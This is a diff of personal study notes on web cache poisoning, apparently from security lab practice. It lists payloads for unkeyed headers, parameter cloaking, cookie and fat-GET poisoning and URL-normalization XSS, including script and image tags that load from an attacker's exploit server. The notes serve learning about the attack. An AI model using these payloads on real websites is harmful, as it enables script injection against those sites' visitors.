@@ -1,17 +1,25 @@
-Theory
-> X-Cache: hit -> came from the cache
-> cache buster example -> ?cj=1234
-
-Poisoing X-Forwarded-Host/Unkeyed headers:
+POISONING VIA X-Forwarded-Host HEADER:
 > X-Forwarded-Host: your-domain.com
 > It may get reflected:
     <script type="text/javascript" src="//exploit-0af1006503fa7a8cc89e0243019500c3.exploit-server.ne/resources/js/tracking.js"></script>
 > Host malicious file under /resources/js/tracking.js
 
-Poisoning cookies:
+PARAMETER CLOAKING
+> identify unkeyed parameters using ParamMiner
+> check if paramter cloaking is possible:
+utm_content=test;callback=alert(1)&cb=12345
+
+POISON COOKIES
 fehost=prod-cache-011"-alert(1)-"something
 
-Poisoning Scheme:
+FAT GET
+> where a request contains a param that gets processed unexpectedly and reflected
+GET / HTTP/1.1
+...
+param_name=abc
+> if doesn't work, try param cloaking
+
+POISONING SCHEME
 GET /resources/js/tracking.js 
 ...
 X-Forwarded-Scheme: nohttp
@@ -28,21 +36,17 @@ Overview:
  
  
 Get User-agent or other:
-<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
+> <img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
  
 Query Paramters do not get cached:
-GET /?evil='/><script>alert(1)</script>
+> GET /?evil='/><script>alert(1)</script>
  
 Guess GET parameters
-GET /?utm_content='/><script>alert(1)</script>
-Use Param Miner's "Guess GET parameters" 
+> GET /?utm_content='/><script>alert(1)</script>
+> Use Param Miner's "Guess GET parameters" 
  
 > /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
  
-Get FAT:
-GET /js/geolocate.js?callback=setCountryCookie
-…
-callback=arbitraryFunction
  
 URL Normalization:
 /<script>alert(1)</script>
@@ -59,3 +63,4 @@ The response may also contain the Cache-Control header, for example, Cache-Contr
 This means the reponse cached response will expire in 35 seconds. At this point, you'll need 
 to make a new request, and the new response will be cached. You can simply determine if 
 the response recived was cached by inspecting the X-Cache header. Miss = not cached, Hit = cached
+
